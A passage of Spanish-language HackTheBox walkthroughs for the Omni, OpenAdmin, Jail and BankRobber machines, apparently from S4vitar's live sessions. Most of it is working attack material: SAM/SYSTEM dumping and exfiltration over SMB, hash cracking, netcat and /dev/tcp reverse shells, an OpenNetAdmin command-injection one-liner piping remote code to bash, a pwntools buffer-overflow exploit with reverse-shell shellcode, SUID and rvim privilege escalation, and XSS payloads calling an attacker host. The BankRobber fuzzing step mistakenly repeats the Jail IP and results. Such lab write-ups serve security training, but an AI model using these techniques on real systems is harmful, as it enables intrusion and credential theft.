cd C:\Data\Users
mkdir Temp
cd Temp
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup
```

Nos transferimos los ficheros creando un recurso compartido a nivel de red.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
```

Desde la maquina victima, nos creamos una unidad logica, la qual se conecta a nuestro recurso compartido

```bash
net use x: \\10.10.14.8\smbFolder /user:s4vitar s4vitar123
dir x:\
dir C:\Temp
copy sam.backup x:\sam
copy system.backup x:\system
```

#### Crackeando los hashes NT con John {-}

Ahora intentamos dumpear los hashes de los usuarios con **secretsdump**.

```bash
secretsdump.py -sam sam -system system LOCAL
```

Hemos podido obtener los hashes NT de los usuarios del systema. Los copiamos y los metemos en un fichero llamado hashes.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=NT
```

Aqui hemos podido crackear el hash del usuario **app**

#### Creando una reverseshell desde Windows Device Portal {-}

Nos connectamos al portal de la web a la url `http://10.10.10.204:8080`. Aqui buscamos manera de ejecutar comandos como en Cualquier gestor
de contenido o panel de administracion. Y encontramos en el menu Processes un link llamado **Run command**.

Probamos con `echo %USERNAME%` y ejecuta el comando como el usuario app. Creamos un reverseshell.

1. Nos ponemos en escuchar por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el ncat previamente uploadeado en el systema

    ```bash
    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443
    ```

Ya somos el usuario app y intentamos ejecutar la operacion cryptografica para leer la flag.

```bash
cd C:\Data\app
powershell
(Import-CliXml -Path user.txt)
(Import-CliXml -Path user.txt).GetNetworkCredential()
(Import-CliXml -Path user.txt).GetNetworkCredential().password
```

Ya tenemos la flag.


<!--chapter:end:44-Omni/44-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
dir
```

Aqui vemos un fichero un poco raro llamado iot-admin.xml y el contenido tambien es un secret string.

```bash
(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
```

Ya vemos un password para el usuario admin. Intentamos connectar al Windows Device Portal con el usuario administrator y
podemos connectarnos. Esto significa que vamos a hacer lo mismo que con el usuario app.

1. Nos ponemos en escuchar por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el ncat previamente uploadeado en el systema

    ```bash
    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443
    ```

Ya somos el usuario Administrator y intentamos ejecutar la operacion cryptografica para leer la flag.

```bash
cd C:\Data\administrator
powershell
(Import-CliXml -Path root.txt)
(Import-CliXml -Path root.txt).GetNetworkCredential()
(Import-CliXml -Path user.txt).GetNetworkCredential().password
```

Ya tenemos la flag del usuario Administrator.



<!--chapter:end:44-Omni/44-04-PrivilegeEscalation.Rmd-->

# OpenAdmin {-}

## Introduccion {-}

La maquina del dia se llama OpenAdmin.

El replay del live se puede ver aqui

[![S4vitaar OpenAdmin maquina](https://img.youtube.com/vi/0vmm0I644fs/0.jpg)](https://www.youtube.com/watch?v=0vmm0I644fs)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:45-OpenAdmin/45-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.171
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.171
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.171 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.171 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | tcp      | Web, Fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.171
```

Es un Apache 2.4.29 en un Ubuntu. 


#### Checkear la web {-}

Si entramos en la url `http://10.10.10.171`, Vemos la Apache2 default page.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.171/FUZZ
```

Vemos un directorio `/arcwork` que no nos muestra gran cosa. Tambien vemos un directorio `/music` y vemos que el login nos lleva a un directorio
`/ona`

Pinchamos y llegamos a un panel de administracion de `opennetadmin`

<!--chapter:end:45-OpenAdmin/45-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### opennetadmin {-}

```bash
searchsploit opennetadmin
```

Aqui vemos un exploit en bash para para el opennetadmin 18.1.1 y en la web estamos frente a uno de esta misma version

```bash
searchsploit -x 47691
```

Vemos que es un simple oneliner que envia con curl una peticion por POST. Intentamos con un whoami

```bash
curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 | html2text
```

Vemos que esto funcciona sin problemas. Intentamos ver si tenemos conectividad con la maquina.

1. Lanzamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos una peticion curl a nuestra maquina

    ```bash
    curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.14.8;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
    ```

Como hemos recibido la peticion get, intentamos ganar accesso al systema.

<!--chapter:end:45-OpenAdmin/45-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con curl al opennetadmin {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un fichero index.html con codigo bash

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos el curl con reverseshell

    ```bash
    curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.14.8|bash;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
    ```

Ya hemos ganado accesso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting {-}

```bash
ls
grep -r -i -E "user|pass|key|database"
grep -r -i -E "user|pass"
cd /home
find \-name user.txt 2>/dev/null
find \-name user.txt
id
sudo -l
cd /var/www
ls -la
cd internal
cd /opt/ona/www
ls
find \-type f 2>/dev/null | grep "config"
```

Aqui no hemos podido entrar en los directorios de los usuarios, y en el directorio internal del `/var/www`. Hemos visto
quel directorio `/var/www/ona` era un link symbolico a `/opt/ona/www` y buscando por archivos conteniendo config en su nombre,
hemos caido en un fichero `database_settings.inc.php` que contiene credenciales.

```bash
grep "sh$" /etc/passwd
su jimmy
Password: 
```

Hemos podido conectarnos como el usuario **jimmy** pero la flag no esta en su directorio de usuario. Parece que tenemos que convertirnos
en el usuario **joanna**.

```bash
id
```

Aqui vemos quel usuario es parte del grupo **internal**. Miramos lo que hay en el directorio `/var/www/internal`

```bash
cd /var/www/internal
ls -la
cat main.php
```

Vemos que en la web de internal se podria ver el id_rsa de joanna. Miramos la configuracion de esta web

```bash
cd /etc/apache2/sites-available
cat internal.conf
```

Aqui vemos que hay una web montada en local por el puerto 52846. Lo mas interesante aqui es quel usuario joanna a sido asignada
como AssignUserID de este servicio. Intentamos comprometer este servicio, directamente desde la maquina victima.

```bash
cd /var/www/internal
curl localhost:52846
```

Aqui vemos que podemos acceder a la web internal.

1. creamos un nuevo fichero s4vishell.php

    ```php
    <?php
        system("whoami");
    ?>
    ```

1. lanzamos una peticion get a este fichero

    ```bash
    curl localhost:52846/s4vishell.php
    #Output
    joanna
    ```

En el fichero `main.php` vemos que hace un echo de la id_rsa de joanna. Lo miramos con curl

```bash
curl localhost:52846/main.php
```

copiamos la key en un fichero joanna_rsa en nuestra maquina de ataquante y nos connectamos con ssh

```bash
chmod 600 joanna_rsa
ssh joana@10.10.10.171 -i joanna_rsa
```

Aqui vemos que la id_rsa esta protegida por una contraseña. Crackeamos la llave.

#### Crackeamos la id_rsa con ssh2john {-}

```bash
/usr/share/john/ssh2john.py joanna_rsa > hash
john --wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui ya tenemos la contraseña de la id_rsa de joanna y nos podemos conectar

```bash
ssh -i joanna_rsa joanna@10.10.10.171
Enter passphrase
```

y ya podemos leer la flag.


<!--chapter:end:45-OpenAdmin/45-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Aqui vemos que podemos ejecutar nano /opt/priv como el usuario root sin proporcionar contraseña.

```bash
sudo -u root nano /opt/priv

Ctrl+r
Ctrl+x

chmod 4755 /bin/bash

Enter
```

Ya podemos ver que la `/bin/bash` tiene privilegios SUID y que podemos convertirnos en root para leer la flag

```bash
ls -la /bin/bash
bash -p
whoami
#Output
root
```

<!--chapter:end:45-OpenAdmin/45-04-PrivilegeEscalation.Rmd-->

# Jail {-}

## Introduccion {-}

La maquina del dia se llama Jail.

El replay del live se puede ver aqui

[![S4vitaar Jail maquina](https://img.youtube.com/vi/IdFJ5vW_Enc/0.jpg)](https://www.youtube.com/watch?v=IdFJ5vW_Enc)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:46-Jail/46-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.34
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.34
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.34 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.34 -oN targeted
```


| Puerto | Servicio  | Que se nos occure? | Que falta? |
| ------ | --------- | ------------------ | ---------- |
| 22     | tcp       | Conneccion directa | creds      |
| 80     | http      | Web, Fuzzing       |            |
| 111    | rpcbind   |                    |            |
| 2049   | nfs       |                    |            |
| 7411   | daqstream |                    |            |
| 20048  | mountd    |                    |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.34
```

Es un Apache 2.4.6 en un CentOS. 


#### Checkear la web {-}

Si entramos en la url `http://10.10.10.34`, Vemos la Apache2 default page.


#### Checkeando la cavezera con curl {-}

```bash
curl -s -X GET "http://10.10.10.34"
curl -s -X GET "http://10.10.10.34" -I
```

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.34/FUZZ
```

Vemos un directorio `/jailuser` que lista un directorio `dev` que contiene ficheros. Nos descargamos estos ficheros.


### Analysando el puerto 7411 {-}

```bash
nc 10.10.10.34 7411
```

Nos pone **send user command** pero no llegamos a ver nada por el momento.

### Analyzando el NFS {-}

Buscando por internet que es el NFS y de que manera podriamos scanear este servicio, vemos que funcciona
como recursos compartidos a nivel de red que podriamos scanear con la utilidad `showmount` y que podriamos
montar en nuestro equipo.

```bash
showmount -e 10.10.10.34
```

### Analysis de los ficheros descargados {-}

Hemos descargado 3 ficheros:

- jail
- jail.c
- compile.sh

El fichero `compile.sh` nos muestra de que manera compila el fichero jail.c para crear un binario jail de 32 bits y como lanza el servicio.

Miramos que typo de fichero y de seguridad lleva el fichero jail con:

```bash
chmod +x jail
file jail
checksec jail
```

Aqui vemos que este fichero es de 32 bits y vemos que no tiene ninguna proteccion como DEP o PIE.

Mirando el codigo del fichero `jail.c` vemos un print que nos dice **send user command** y que usa funcciones como `strcmp()`
que ya sabemos que son vulnerables.

Ahora que vemos por donde van los tiros y que esta maquina tocara un BOF, analyzamos las vulnerabilidades.

<!--chapter:end:46-Jail/46-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### Buffer Overflow {-}

El codigo nos muestra que compara una String con un username `admin` y una contraseña `1974jailbreak!`.
Vemos que hay una posibilidad de lanzar el binario en modo **Debug**. 

Vemos que una de estas comparativas va con una variable `userpass` que solo tiene un Buffer de 16 Bytes y 
que si lanzamos el binario en modo debug, nos printa la direccion memoria de esta variable.

Tambien vemos que el binario abre el puerto 7411 y lo comprobamos con `lsof`

```bash
lsof -i:7411
./jail
lsof -i:7411
```

#### Analyzando vulnerabilidades con gdb {-}

Lanzamos el binario con gdb

```bash
gdb ./jail
r
```

Y nos connectamos por el puerto 7411

```bash
nc localhost 7411
```

Vemos que el gdb  a creado un processo hijo de modo Detach que no seria la buena forma para tratar. Lo comprobamos 
colapsando el programa poniendo mas de 16 A en el password

```bash
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui no vemos nada en el gdb. En estos casos tenemos que configurar una cosa para ver el flujo del processo hijo.

```bash
gdb ./jail
set detach-on-fork off
set follow-fork-mode child
r
```

Aqui ya estamos syncronizados con el processo hijo.

```bash
nc localhost 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Intentamos el modo debug 

```bash
nc localhost 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.

USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Debug: userpass buffer @ 0xffffd140
```

Vemos la direccion de la variable userpass y si repetimos la movida multiples vecez, vemos que la direccion no cambia.
Ademas, ya vemos que sobre escribimos registros con A y desde aqui seguimos la guia de un BOF

1. Buscamos Ganar el control del **eip** 

    - creamos un pattern de 150 caracteres
    
        ```bash
        gef➤ pattern create 150
        [+] Generating a pattern of 150 bytes (n=4)
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        [+] Saved as '$_gef0'
        ```

    - lanzamos el script otra vez y pegamos los caracteres

        ```bash
        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        ```

    - el programa peta una vez mas pero el valor del `$eip` a cambiado. Miramos el offset con el commando

        ```bash
        gef➤  pattern offset $eip
        [+] Searching for '$eip'
        [+] Found at offset 28 (little-endian search) likely
        ``` 

        Aqui vemos que tenemos que entrar 28 caracteres antes de sobre escribir el **eip**.

    - Probamos con 28 A y 4 B.

        ```bash
        python -c '28*"A"+4*"B"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
        ```

    - añadimos 4 C para saber donde caen la cosas despues del **eip**

        ```bash
        python -c '28*"A"+4*"B"+8*"C"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC

        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC
        ```

1. Miramos lo que hay en la direccion de la variable userpass

    - lo miramos en forma normal

        ```bash
        gef➤  x/s 0xffffd140
        #Output
        0xffffd140: 'A' <repeats 28 times>, "BBBBCCCCCCCC"
        ```

    - lo miramos en forma hexadecimal
    
        ```bash
        gef➤  x/16wx 0xffffd140
        #Output
        0xffffd140  0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd150  0x41414141  0x41414141  0x41414141  0x42424242
        0xffffd160  0x43434343  0x43434343  0x00000100  0xf7ff4070
        0xffffd170  0x00000001  0xf7ffd590  0x00000000  0x414112db
        ``` 

Aqui vemos que la direccion `0xffffd140` apunta al principio del Buffer (la entrada del usuario). Esto significa
que si el **eip** apunta a la direccion `0xfffd140` sumada por 32 bytes (que serian las 28 A mas los 4 bytes del **eip**),
podriamos ejecutar el shellcode que queremos.

<div class="figure">
<img src="images/Jail-Buffer-shellcode-pos.png" alt="Buffer shell code position" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-81)Buffer shell code position</p>
</div>

Para esto nos creamos un script en python

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='i386')

p = remote("127.0.0.1", 7411)
# p = remote("10.10.10.34", 7411)


buf = b"\xdb\xc8\xd9\x74\x24\xf4\x5e\xbb\xc5\x90\x9f\x66\x33"
buf += b"\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x9b\x83\x7d"
buf += b"\x93\x12\x7f\x76\xbf\x07\x3c\x2a\x2a\xa5\x4b\x2d\x1a"
buf += b"\xcf\x86\x2e\xc8\x56\xa9\x10\x22\xe8\x80\x17\x45\x80"
buf += b"\x18\xe2\xbb\x58\x75\xf0\xc3\x59\x3e\x7d\x22\xe9\x26"
buf += b"\x2e\xf4\x5a\x14\xcd\x7f\xbd\x97\x52\x2d\x55\x46\x7c"
buf += b"\xa1\xcd\xfe\xad\x6a\x6f\x96\x38\x97\x3d\x3b\xb2\xb9"
buf += b"\x71\xb0\x09\xb9"

before_eip = ("A" * 28).encode()
EIP = p32(0xffffd140+32)
after_eip = buf

p.recvuntil("OK Ready. Send USER command.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS ".encode() + before_eip + EIP + after_eip)
```

> [ ! ] NOTAS: el shellcode a sido creado con el comando `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -b "\x00\x0a" -f python`. Los badchars
aqui son los que ponemos siempre.

Ahora testeamos el script

1. Lanzamos el jail

    ```bash
    ./jail
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script en python

    ```bash
    python3 exploit.py
    ```

En este caso no funcciona y tito nos adelanta que el problema viene que de vez en cuando, el espacio del shellcode sobrepasa el limite de caracteres que podemos injectar, 
o mejor dicho es demasiado grande. Esta limitacion puede ser bypasseada por una tecnica llamada **reuse addr** explicada en la web de [rastating](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/).
La tecnica consiste en utilizar methodos **send** o **recv** del socket de coneccion para ganar espacio para el shellcode.

Si buscamos por shellcode re-use en [exploit-db](https://www.exploit-db.com/shellcodes/34060), podemos encontrar shellcode que crearian un `/bin/bash`

Modificamos el shellcode del exploit.py y ganamos accesso a la maquina victima


<!--chapter:end:46-Jail/46-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con el bufferoverflow {-}

1. Lanzamos el debug mode para recuperar la direccion del buffer

    ```bash
    nc 10.10.10.34 7411
    OK Ready. Send USER command.
    DEBUG
    OK DEBUG mode on.
    USER admin
    OK Send PASS command.
    PASS admin
    Debug: userpass buffer @ 0xffffd140
    ```

1. Modificamos el script en python

    ```python
    #!/usr/bin/python3

    from pwn import *

    context(os='linux', arch='i386')

    # p = remote("127.0.0.1", 7411)
    p = remote("10.10.10.34", 7411)

    buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
    buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
    buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
    buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    buf += b"\x89\xe3\x31\xc9\xcd\x80"


    before_eip = ("A" * 28).encode()
    EIP = p32(0xffffd140+32)
    after_eip = buf

    p.recvuntil("OK Ready. Send USER command.")
    p.sendline("USER admin")
    p.recvuntil("OK Send PASS command.")
    p.sendline("PASS ".encode() + before_eip + EIP + after_eip)

    p.interactive()
    ```

1. Lanzamos el script en python

    ```bash
    python3 exploit.py
    ```


Ya hemos ganado acceso al systema como el usuario **nobody** pero no podemos leer la flag y nos tenemos que convertir en el usuario frank.

### User pivoting {-}

```bash
id
sudo -l
```

Vemos que podemos lanzar el script `/opt/logreader/logreader.sh` como el usuario frank sin proporcionar contraseña.

```bash
cat /opt/logreader/logreader.sh
sudo -u frank /opt/logreader/logreader.sh
which strace
which ltrace
which checkproc
```

Vemos que podemos lanzar el script pero no sabemos exactamente lo que hace y no lo podemos debuggear. 

Miramos a los recursos compartidos **nfs** de la maquina

```bash
cat /etc/exports
```

Nos creamos dos monturas en nuestra maquina de atacante

```bash
mkdir /mnt/{opt,var}
cd /mnt
mount -t nfs 10.10.10.34:/opt /mnt/opt
mount -t nfs 10.10.10.34:/var/nfsshare /mnt/var
ls -l
ls -l opt/
ls -l opt/logreader
ls -l opt/rh
ls -l var/
```

Aqui vemos que no tenemos derechos de lectura ni de escritura sobre el directorio opt y var pero algo que nos llama la atencion son los user y groups asignados a estos 
directorios, sobre todo el directorio var que se nos aparece como estando del grupo docker.

<div class="figure">
<img src="images/Jail-lla.png" alt="groups nfs share folders" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-82)groups nfs share folders</p>
</div>

Esto suele pasar porque nuestro grupo docker en nuestra maquina de atacante tiene el mismo id que el usuario franck de la maquina victima. Esto significa que
hay una colision entre los dos grupos y que como usuario del grupo docker en nuestra maquina de atacante, podemos crear ficheros como el usuario franck de la
maquina victima

> [ ! ] NOTAS: Si no existe docker en nuestra maquina de atacante, tendriamos que ver el numero 1000 y tendriamos que crear un grupo con este id para operar

1. Creamos un fichero en C en el directorio `/mnt/var`

    ```bash
    #include <unistd.h>
    #include <stdio.h>

    int main(){
        setreuid(1000, 1000);
        system("/bin/bash");
        return 0;
    }
    ```

1. Compilamos el script

    ```bash
    gcc shell.c -o shell
    ```

1. Cambiamos el grupo y ponemos derechos SUID al binario

    ```bash
    chgrp 1000 shell
    chmod u+s shell
    ```

1. lanzamos el script desde la maquina victima

    ```bash
    ./shell
    whoami
    #Output
    frank
    ```

Ya podemos leer la flag.

> [ ! ] NOTAS: como la reverse shell no es la mejor del mundo, aqui nos podriamos crear una id_rsa y copiarla en el authorized_keys del usuario Frank para
conectarnos por ssh y obtener una mejor shell.

<!--chapter:end:46-Jail/46-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Aqui vemos que podriamos ejecutar el `/usr/bin/rvim` del fichero `/var/www/html/jailuser/dev/jail.c` como el usuario adm sin proporcionar contraseña.

```bash
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

:!/bin/sh
#Output 
No se permite orden de consola en rvim

:set shell = /bin/bash
:shell
```

Aqui vemos que no podemos ejecutar comandos pero lo bueno es que rvim permite ejecutar codigo en python

```bash
:py import pty;pty.spawn("/bin/bash")
whoami 
#Output
adm
```

Aqui vemos que estamos en el directorio `/var/adm`

```bash
ls -la
cd .keys
ls -la
cat note.txt
```

Vemos un mensaje del Administrator a frank diciendole que su contraseña para encryptar cosas tiene que ser sur segundo nombre seguido de 4 digitos y un simbolo.

```bash
cd .local
ls -la
cat .frank
#Output
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

Lanzamos la web de [quipqiup](https://www.quipqiup.com/) y copiamos el mensaje y nos lo traduce por 
**Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!**

Tambien hay un `keys.rar`.

Lo codificamos en base64 y nos lo tranferimos a nuestra maquina de atacante.

```bash
base64 -w 0 keys.rar; echo
```

y desde la maquina de atacante no copiamos el base64 y lo decodificamos

```bash
echo "hash de base64" | base64 -d > keys.rar
unrar x keys.rar
```

Aqui nos pide una contraseña para unrarear el `keys.rar` y buscando por internet Alcatraz Escape vemos que un Frank Morris se escapo de Alcatraz en 1962.
Vamos a tirar de la utilidad de crunch para crackear la contraseña.

```bash
crunch 11 11 -t Morris1962^ > passwords
rar2john keys.rar > hash
john --wordlist=passwords hash
```

Encontramos la contraseña `Morris1962!`

```bash
unrar x keys.rar
Password: Morris1962!
mv rootauthorizedsshkey.pub id_rsa.pub
cat id_rsa.pub
```

aqui vemos la key publica del usuario root, pero no podemos hacer gran cosa con la key publica. Como no parece muy grande, intentamos ver si podemos computar la llave
privada des esta key.

```python
python3

from Crypto.PublicKey import RSA
f = open ("id_rsa.pub", "r")
key = RSA.importKey(f.read())
print(key.n)
print(key.p)
print(key.q)
print(key.e)
```

Aqui como `key.n` es demasiado grande, no a sido posible computar `key.p` o `key.q` que nos ubiera permitido intentar generar una private key.

Miramos si podemos hacerlo desde [factordb](http://factordb.com/) pero es lo mismo. Pero existen webs para los ctf como [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
que podemos usar.

```bash
git clone https://github.com/Ganapati/RsaCtfTool
cd RsaCtfTool
python3 RsaCtfTool.py --publickey id_rsa.pub --private
```

Esperamos un poco y podemos ver la id_rsa. Lo copiamos en un ficher id_rsa y nos conectamos por ssh.

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.34
```

Ya somos root y podemos leer la flag.

<!--chapter:end:46-Jail/46-04-PrivilegeEscalation.Rmd-->

# BankRobber {-}

## Introduccion {-}

La maquina del dia se llama BankRobber.

El replay del live se puede ver aqui

[![S4vitaar BankRobber maquina](https://img.youtube.com/vi/QaKIzdeEQo4/0.jpg)](https://www.youtube.com/watch?v=QaKIzdeEQo4)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:47-BankRobber/47-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.154
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.154
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.154 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443,445,3306 10.10.10.154 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web Fuzzing        |            |
| 443    | https    | Web Fuzzing        |            |
| 445    | smb      | Null session       |            |
| 3306   | mysql    | Injeccion SQL      |            |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.154
smbclient -L 10.10.10.154 -N
smbmap -H 10.10.10.154 -u 'null'
```

Vemos que estamos en frente de una maquina Windows 10 Pro que se llama **BANKROBBER** en el dominio **Bankrobber** con un certificado no firmado.
Tambien vemos que no podemos ver los recursos compartidos a nivel de red con un null session.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.154
whatweb https://10.10.10.154
```

Es un Apache 2.4.39 Win64 que usa openSSL y PHP 7.3.4 

#### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.154:443
```

Aqui no vemos ningun dominio o cosa interesante.

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.154`, Vemos una pagina que habla de bitcoin y nos permite loggear o registrar. Empezamos por crear una cuenta
y nos loggeamos.

Aqui vemos que podemos transferir E-coin a alguien. Le ponemos

```bash
Amount: 1
ID of Addressee: 1
Comment to him/her: EEEEEEEEEE
```

Si transferimos, aparece una popup que nos dice que `Transfer on hold. An admin will review it within a minute.`




#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.34/FUZZ
```

Vemos un directorio `/jailuser` que lista un directorio `dev` que contiene ficheros. Nos descargamos estos ficheros.



<!--chapter:end:47-BankRobber/47-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### XSS {-}

Testeamos que accion puede efectuar el administrador y por el mismo tiempo, si el input de comment es vulnerable a un **XSS**.

1. Nos montamos un servidor web en python

    ```bash
    python3 -m http.server 80
    ```

1. Modificamos los valores de la transferencia

    ```bash
    Amount: 1
    ID of Addressee: 1
    Comment to him/her: <script src="http://10.10.17.51/diamondjackson.jpg"></script>
    ```

Aqui vemos que esta vulnerable a XSS porque recibimos una peticion GET.


La idea aqui seria robar la cookie de session del administrador.

1. Checkeamos nuestra propria cookie de session con Burpsuite

    <div class="figure">
    <img src="images/BankRobber-mycookie.png" alt="get cookie with Burpsuite" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-83)get cookie with Burpsuite</p>
    </div>

1. Como la cookie esta URL encodeada le damos a Ctrl+Shift+U y copiamos la cookie
1. Analyzamos la cookie

    - Tiene 3 campos, *id* - *username* - *password*
    - Decodificamos el username

        ```bash
        echo "czR2aXRhcg==" | base64 -d; echo
        #Output
